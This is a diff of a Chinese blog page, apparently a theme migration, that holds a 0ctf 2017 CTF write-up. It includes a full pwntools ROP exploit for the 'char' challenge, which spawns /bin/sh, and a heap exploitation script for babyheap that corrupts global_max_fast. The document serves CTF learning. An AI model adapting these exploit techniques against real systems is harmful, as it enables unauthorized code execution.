@@ -1,86 +1,17 @@
-<!doctype html>
-
-
-
-  
-
-
-<html class="theme-next muse use-motion">
+<!DOCTYPE html>
+<html lang="zh-Hans">
 <head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
 
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
 
-
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
-
-
-
-
-  
-  
-  
-  
-
-  
-    
-    
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-    
-    
-    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
-  
-
-
-
-
-
-
-<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
-
-<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
-
-
-  <meta name="keywords" content="ctf,pwn,writeup," />
-
-
-
-
-
-
-
-
-  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
-
-
-
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="DazzleP" />
 
 
 
@@ -96,179 +27,280 @@
 <meta name="twitter:title" content="0ctf 2017 writeup">
 <meta name="twitter:description" content="这次0ctf自己做了俩pwn，和西电dalao一块做了一个，总体来说还是被虐惨了">
 
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
 
-<script type="text/javascript" id="hexo.configuration">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    scheme: 'Muse',
-    sidebar: {"position":"left","display":"always"},
-    fancybox: true,
-    motion: true,
-    duoshuo: {
-      userId: 6341178207034672000,
-      author: '博主'
+    <link rel="alternate" href="/atom.xml" title="DazzleP&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>0ctf 2017 writeup | DazzleP&#39;s Blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: undefined
     }
-  };
 </script>
 
-  <title> 0ctf 2017 writeup | DazzleP's Blog </title>
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
 </head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
-
-  
-
-
-
-
-
-
-
-
-
-
-  
-  
-    
-  
-
-  <div class="container one-collumn sidebar-position-left page-post-detail ">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-meta ">
-  
-
-  <div class="custom-logo-site-title">
-    <a href="/"  class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <span class="site-title">DazzleP's Blog</span>
-      <span class="logo-line-after"><i></i></span>
-    </a>
-  </div>
-  <p class="site-subtitle">A simple record place</p>
-</div>
-
-<div class="site-nav-toggle">
-  <button>
-    <span class="btn-bar"></span>
-    <span class="btn-bar"></span>
-    <span class="btn-bar"></span>
-  </button>
-</div>
-
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
-        
-        <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
-            
-            首页
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-archives">
-          <a href="/archives" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
-            
-            归档
-          </a>
-        </li>
-      
-
-      
-    </ul>
-  
-
-  
-</nav>
-
- </div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">DazzleP</a></h1>
+        </hgroup>
 
         
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                0ctf 2017 writeup
-              
-            
-          </h1>
+        <p class="header-subtitle">A simple record place</p>
         
 
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2017-03-24T23:02:47+08:00" content="2017-03-24">
-              2017-03-24
-            </time>
-          </span>
+        
 
-          
 
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2017/03/24/0ctf-2017-writeup/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/03/24/0ctf-2017-writeup/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
 
-          
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/coding/">coding</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/elf-structure/">elf-structure</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/glibc，pwn/">glibc，pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwm-writeup-heap-ctf/">pwm, writeup, heap, ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn-ctf-writeup/">pwn ctf writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn-writeup/">pwn writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn-writeup-ctf/">pwn, writeup, ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn-ctf-writeup-heap/">pwn,ctf,writeup,heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
 
-          
-          
-
-          
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于前端</div>
+                </section>
+                
+            </div>
         </div>
-      </header>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">DazzleP</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">DazzleP</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">A simple record place</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-0ctf-2017-writeup" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/03/24/0ctf-2017-writeup/" class="article-date">
+      <time datetime="2017-03-24T15:02:47.000Z" itemprop="datePublished">2017-03-24</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
     
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      0ctf 2017 writeup
+    </h1>
+  
 
-
-    <div class="post-body" itemprop="articleBody">
-
+      </header>
       
-      
+      <div class="article-info article-info-post">
+        
 
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
       
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
         <h2 id="char"><a href="#char" class="headerlink" title="char"></a>char</h2><p>很明显的栈溢出，但是程序会检查输入是否全为可打印字符，比较良心的是程序把一个libc映射到0x5555e000这个段上，算是让我们有点gadget可用<br>因为程序通过<code>strlen()</code>获取输入长度，所以我们可以在输入中间加上<code>&#39;\x00&#39;</code>来截断<code>strlen()</code>，这样只需要<code>&#39;\x00&#39;</code>之前的部分全为可打印字符，之后的payload不受影响<br>只需要找到合适的gadget让栈跳到后方返回就可以了</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line">base = <span class="number">0x5555e000</span></div><div class="line"></div><div class="line"><span class="comment">#0x0001706b : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></div><div class="line">int80 = <span class="number">0x00B7E36</span></div><div class="line">pop5_ret = <span class="number">0x0001706b</span></div><div class="line">ret80 = <span class="number">0x00132d35</span></div><div class="line">ret52 = <span class="number">0x00004234</span></div><div class="line">pop4_ret10 = <span class="number">0x00017e76</span></div><div class="line">addesp9c_ret = <span class="number">0x000e3cee</span></div><div class="line">addesp98_pop_ret = <span class="number">0x0011cf7a</span></div><div class="line">mov_eax_ecx = <span class="number">0x00148251</span></div><div class="line">xchg_esp_eax = <span class="number">0x000e6d62</span></div><div class="line">add_esp1c_ret = <span class="number">0x00115f35</span></div><div class="line"></div><div class="line">p = process(<span class="string">'./char_patched'</span>)</div><div class="line"><span class="comment">#p = remote('202.120.7.214', 23222)</span></div><div class="line"></div><div class="line">ebx_ret = <span class="number">0x0007dce9</span></div><div class="line">edx_ecx_eax_ret = <span class="number">0x000f277f</span></div><div class="line"></div><div class="line">scanf_plt = <span class="number">0x08048540</span></div><div class="line">pop2_ret = <span class="number">0x804889a</span></div><div class="line">s2400 = <span class="number">0x804894C</span></div><div class="line">data = <span class="number">0x804A03C</span></div><div class="line">system_addr = <span class="number">0x003EED0</span> + base</div><div class="line">execve_addr = <span class="number">0x0003ECF2</span> + base</div><div class="line">eax_ret = <span class="number">0x0016a7d4</span> + base</div><div class="line">pop3_ret = <span class="number">0x8048899</span></div><div class="line">binsh = <span class="number">0x556bb7ec</span></div><div class="line"></div><div class="line">main_addr = <span class="number">0x08048693</span></div><div class="line">write_plt = <span class="number">0x8048520</span></div><div class="line">write_got = <span class="number">0x804A030</span></div><div class="line">puts_plt = <span class="number">0x80484B0</span></div><div class="line">scanf_got = <span class="number">0x804A038</span></div><div class="line">strcpy_got = <span class="number">0x0804A010</span></div><div class="line">strcpy_plt = <span class="number">0x080484A0</span></div><div class="line">libc_start_main_got = <span class="number">0x804A00C</span> + <span class="number">4</span></div><div class="line">edx_ret = <span class="number">0x00001a9e</span> + base</div><div class="line">ecx_ret = <span class="number">0x000cae3b</span> + base</div><div class="line"></div><div class="line">inc_eax_ret = <span class="number">0x00026a9b</span> + base</div><div class="line"></div><div class="line">log.info(hex(write_plt))</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">28</span></div><div class="line">payload += p32(add_esp1c_ret + base)</div><div class="line">payload += p32(mov_eax_ecx + base)</div><div class="line">payload += p32(xchg_esp_eax + base)</div><div class="line">payload += <span class="string">'\x00'</span> * <span class="number">3</span></div><div class="line">payload += p32(<span class="number">0xdeadbeef</span>)</div><div class="line">payload += p32(<span class="number">0xdeadbeef</span>) * <span class="number">5</span></div><div class="line">payload += p32(ebx_ret + base)</div><div class="line">payload += p32(binsh)</div><div class="line">payload += p32(edx_ret)</div><div class="line">payload += p32(<span class="number">0x00</span>)</div><div class="line">payload += p32(ecx_ret)</div><div class="line">payload += p32(<span class="number">0x00</span>)</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>):</div><div class="line">	payload += p32(inc_eax_ret)</div><div class="line"></div><div class="line">payload += p32(int80 + base)</div><div class="line"></div><div class="line">pause()</div><div class="line"></div><div class="line">log.info(len(payload))</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'GO : ) \n'</span>)</div><div class="line">p.send(payload + <span class="string">'\n'</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
 <h2 id="diethard"><a href="#diethard" class="headerlink" title="diethard"></a>diethard</h2><p>一个自己实现的内存管理系统，程序会根据申请内存的大小分配一个类似index的东西，相同index的堆块会分配到同一页，计算了一下发现index为8时，对应的对块大小集合元素最多<br>其中分配1032和2016大小的堆块会出bug，不用释放内存就出现堆块重叠了。。。</p>
@@ -277,326 +309,206 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'info'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(p, size)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Command: '</span>)</div><div class="line">    p.send(<span class="string">'1\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Size: '</span>)</div><div class="line">    p.send(str(size) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fill</span><span class="params">(p, idx, size, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Command: '</span>)</div><div class="line">    p.send(<span class="string">'2\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Index: '</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Size: '</span>)</div><div class="line">    p.send(str(size) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Content: '</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">(p, idx)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Command: '</span>)</div><div class="line">    p.send(<span class="string">'3\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Index: '</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dump</span><span class="params">(p, idx)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Command: '</span>)</div><div class="line">    p.send(<span class="string">'4\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Index: '</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">p = process(<span class="string">'./babyheap_patched'</span>)</div><div class="line"><span class="comment">#p = remote('202.120.7.218', 2017)</span></div><div class="line"></div><div class="line">New(p, <span class="number">0x80</span>)</div><div class="line">New(p, <span class="number">0x80</span>)</div><div class="line">New(p, <span class="number">0x80</span>)<span class="comment">#</span></div><div class="line">New(p, <span class="number">0x80</span>)</div><div class="line">New(p, <span class="number">0x80</span>)<span class="comment">#</span></div><div class="line">New(p, <span class="number">0x2f0</span>)</div><div class="line">New(p, <span class="number">0x80</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">0x80</span></div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x90</span> * <span class="number">2</span> + <span class="number">1</span>)</div><div class="line"></div><div class="line">Fill(p, <span class="number">0</span>, len(payload), payload)</div><div class="line"></div><div class="line">Free(p, <span class="number">1</span>)</div><div class="line"></div><div class="line">New(p, <span class="number">0x90</span> * <span class="number">2</span> - <span class="number">0x10</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">0x80</span></div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x91</span>)</div><div class="line"></div><div class="line">Fill(p, <span class="number">1</span>, len(payload), payload)</div><div class="line"></div><div class="line">Free(p, <span class="number">2</span>)</div><div class="line"></div><div class="line">Fill(p, <span class="number">1</span>, <span class="number">0x90</span>, <span class="string">'A'</span> * <span class="number">0x90</span>)</div><div class="line"></div><div class="line">Free(p, <span class="number">4</span>)</div><div class="line"></div><div class="line">Dump(p, <span class="number">1</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'A'</span> * <span class="number">0x90</span>)</div><div class="line"></div><div class="line">main_arena = u64(p.recvn(<span class="number">8</span>))</div><div class="line">heap_addr = u64(p.recvn(<span class="number">8</span>))</div><div class="line"><span class="string">'''</span></div><div class="line">libc_base = main_arena - 0x398b58</div><div class="line">global_max_fast = libc_base + 0x39a7d0</div><div class="line">'''</div><div class="line"></div><div class="line">libc_base = main_arena - <span class="number">0x3a5678</span></div><div class="line">global_max_fast = libc_base + <span class="number">0x3a7860</span></div><div class="line"></div><div class="line">log.info(<span class="string">"main_arena : "</span> + hex(main_arena))</div><div class="line">log.info(<span class="string">"heap addr : "</span> + hex(heap_addr))</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">0x80</span></div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x91</span>)</div><div class="line">payload += p64(global_max_fast - <span class="number">0x10</span>) * <span class="number">2</span></div><div class="line"></div><div class="line">Fill(p, <span class="number">1</span>, len(payload), payload)</div><div class="line"></div><div class="line">New(p, <span class="number">0x80</span>)<span class="comment">#modify global_max_fast</span></div><div class="line"></div><div class="line">Free(p, <span class="number">5</span>)<span class="comment">#free 0x2f0 chunk(malloc before)</span></div><div class="line"></div><div class="line">New(p, <span class="number">0x2f0</span>)</div><div class="line">Free(p, <span class="number">4</span>)<span class="comment">#free 0x2f0 chunk(just malloc)</span></div><div class="line"></div><div class="line">fake_chunk_header = <span class="number">0x398617</span> + libc_base</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'\x00'</span> * <span class="number">0x80</span></div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x91</span>)</div><div class="line">payload += p64(heap_addr - <span class="number">0x120</span>)</div><div class="line">payload += p64(main_arena)</div><div class="line">payload += <span class="string">'\x00'</span> * <span class="number">0x70</span></div><div class="line">payload += p64(<span class="number">0x90</span>)</div><div class="line">payload += p64(<span class="number">0x300</span>)</div><div class="line">payload += p64(fake_chunk_header)</div><div class="line"></div><div class="line">Fill(p, <span class="number">3</span>, len(payload), payload)</div><div class="line"></div><div class="line">New(p, <span class="number">0x2f0</span>)</div><div class="line">New(p, <span class="number">0x2f0</span>)<span class="comment">#point to fake chunk</span></div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'\x00'</span> * <span class="number">0x4c9</span></div><div class="line">payload += p64(libc_base + <span class="number">0x00000000003F33A</span>)</div><div class="line"></div><div class="line">Fill(p, <span class="number">5</span>, len(payload), payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
       
     </div>
-
-    <div>
-      
-        
-      
-    </div>
-
-    <div>
-      
-        
-
-      
-    </div>
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/ctf/" rel="tag">#ctf</a>
-          
-            <a href="/tags/pwn/" rel="tag">#pwn</a>
-          
-            <a href="/tags/writeup/" rel="tag">#writeup</a>
-          
-        </div>
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2017/02/27/ZCTF-2017-write-up/" rel="next" title="ZCTF 2017 write up">
-                <i class="fa fa-chevron-left"></i> ZCTF 2017 write up
-              </a>
-            
-          </div>
-
-          <div class="post-nav-prev post-nav-item">
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </article>
-
-
-
-    <div class="post-spread">
-      
-    </div>
-  </div>
-
-
-          </div>
-          
-
-
-          
-  <div class="comments" id="comments">
-    
-      <div class="ds-thread" data-thread-key="2017/03/24/0ctf-2017-writeup/"
-           data-title="0ctf 2017 writeup" data-url="http://yoursite.com/2017/03/24/0ctf-2017-writeup/">
-      </div>
     
   </div>
-
-
-        </div>
-        
-          
   
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/03/24/0ctf-2017-writeup/">0ctf 2017 writeup</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">DazzleP</a></p>
+        <p><span>发布时间:</span>2017-03-24, 23:02:47</p>
+        <p><span>最后更新:</span>2017-05-04, 23:12:16</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/03/24/0ctf-2017-writeup/" title="0ctf 2017 writeup">http://yoursite.com/2017/03/24/0ctf-2017-writeup/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/03/24/0ctf-2017-writeup/　　作者: DazzleP" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
